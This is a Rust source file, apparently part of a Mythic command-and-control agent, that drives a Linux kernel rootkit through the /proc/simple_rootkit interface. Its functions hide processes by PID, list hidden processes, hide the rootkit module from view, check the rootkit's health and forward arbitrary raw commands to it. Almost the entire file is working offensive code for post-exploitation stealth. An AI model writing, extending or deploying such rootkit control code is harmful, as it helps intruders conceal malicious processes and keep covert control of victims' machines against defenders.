use crate::agent::AgentTask;
use crate::mythic_success;
use serde::Deserialize;
use std::error::Error;
use std::fs;
use std::io::Write;

const ROOTKIT_PROC_PATH: &str = "/proc/simple_rootkit";

// Command argument structures
#[derive(Deserialize)]
struct HidePidArgs {
    pid: u32,
}

#[derive(Deserialize)]
struct EmptyArgs {}

/// Helper function to send command to kernel module and get response
fn send_rootkit_command(command: &str) -> Result<String, Box<dyn Error>> {
    // Write command to the proc file
    fs::write(ROOTKIT_PROC_PATH, command)?;
    
    // Read response from the proc file
    let response = fs::read_to_string(ROOTKIT_PROC_PATH)?;
    
    Ok(response.trim().to_string())
}

/// Check if the rootkit module is available
fn check_rootkit_available() -> bool {
    std::path::Path::new(ROOTKIT_PROC_PATH).exists()
}

/// Hide or unhide a process by PID
pub fn hide_process(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    if !check_rootkit_available() {
        return Ok(crate::mythic_error!(
            task.id,
            "Rootkit module not loaded or /proc/simple_rootkit not available"
        ));
    }

    let args: HidePidArgs = serde_json::from_str(&task.parameters)?;
    let command = format!("hide_pid {}", args.pid);
    
    match send_rootkit_command(&command) {
        Ok(response) => {
            if response.starts_with("SUCCESS:") {
                Ok(mythic_success!(task.id, response))
            } else {
                Ok(crate::mythic_error!(task.id, response))
            }
        }
        Err(e) => Ok(crate::mythic_error!(
            task.id,
            format!("Failed to communicate with rootkit: {}", e)
        )),
    }
}

/// List all currently hidden processes
pub fn list_hidden_processes(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    if !check_rootkit_available() {
        return Ok(crate::mythic_error!(
            task.id,
            "Rootkit module not loaded or /proc/simple_rootkit not available"
        ));
    }

    let _args: EmptyArgs = serde_json::from_str(&task.parameters)?;
    
    match send_rootkit_command("list_hidden") {
        Ok(response) => Ok(mythic_success!(task.id, response)),
        Err(e) => Ok(crate::mythic_error!(
            task.id,
            format!("Failed to communicate with rootkit: {}", e)
        )),
    }
}

/// Toggle module visibility (hide/show the rootkit module)
pub fn toggle_module_visibility(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    if !check_rootkit_available() {
        return Ok(crate::mythic_error!(
            task.id,
            "Rootkit module not loaded or /proc/simple_rootkit not available"
        ));
    }

    let _args: EmptyArgs = serde_json::from_str(&task.parameters)?;
    
    match send_rootkit_command("hide_module") {
        Ok(response) => {
            if response.starts_with("SUCCESS:") {
                Ok(mythic_success!(task.id, response))
            } else {
                Ok(crate::mythic_error!(task.id, response))
            }
        }
        Err(e) => Ok(crate::mythic_error!(
            task.id,
            format!("Failed to communicate with rootkit: {}", e)
        )),
    }
}

/// Get rootkit module status
pub fn get_rootkit_status(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    if !check_rootkit_available() {
        return Ok(crate::mythic_error!(
            task.id,
            "Rootkit module not loaded or /proc/simple_rootkit not available"
        ));
    }

    let _args: EmptyArgs = serde_json::from_str(&task.parameters)?;
    
    match send_rootkit_command("status") {
        Ok(response) => Ok(mythic_success!(task.id, response)),
        Err(e) => Ok(crate::mythic_error!(
            task.id,
            format!("Failed to communicate with rootkit: {}", e)
        )),
    }
}

/// Execute arbitrary rootkit command (for advanced usage)
#[derive(Deserialize)]
struct RawCommandArgs {
    command: String,
}

pub fn execute_raw_command(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    if !check_rootkit_available() {
        return Ok(crate::mythic_error!(
            task.id,
            "Rootkit module not loaded or /proc/simple_rootkit not available"
        ));
    }

    let args: RawCommandArgs = serde_json::from_str(&task.parameters)?;
    
    match send_rootkit_command(&args.command) {
        Ok(response) => Ok(mythic_success!(task.id, response)),
        Err(e) => Ok(crate::mythic_error!(
            task.id,
            format!("Failed to communicate with rootkit: {}", e)
        )),
    }
}

/// Check if rootkit module is loaded and responsive
pub fn check_rootkit_health(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let _args: EmptyArgs = serde_json::from_str(&task.parameters)?;
    
    if !check_rootkit_available() {
        return Ok(crate::mythic_error!(
            task.id,
            "Rootkit module not available - /proc/simple_rootkit does not exist"
        ));
    }

    // Try to get status to verify the module is responsive
    match send_rootkit_command("status") {
        Ok(response) => Ok(mythic_success!(
            task.id,
            format!("Rootkit is healthy and responsive:\n{}", response)
        )),
        Err(e) => Ok(crate::mythic_error!(
            task.id,
            format!("Rootkit module exists but not responsive: {}", e)
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_check_rootkit_available() {
        // This test will only pass if the rootkit module is actually loaded
        // In a real scenario, you might want to mock this
        println!("Rootkit available: {}", check_rootkit_available());
    }

    #[test]
    fn test_command_formatting() {
        let command = format!("hide_pid {}", 1234);
        assert_eq!(command, "hide_pid 1234");
    }
}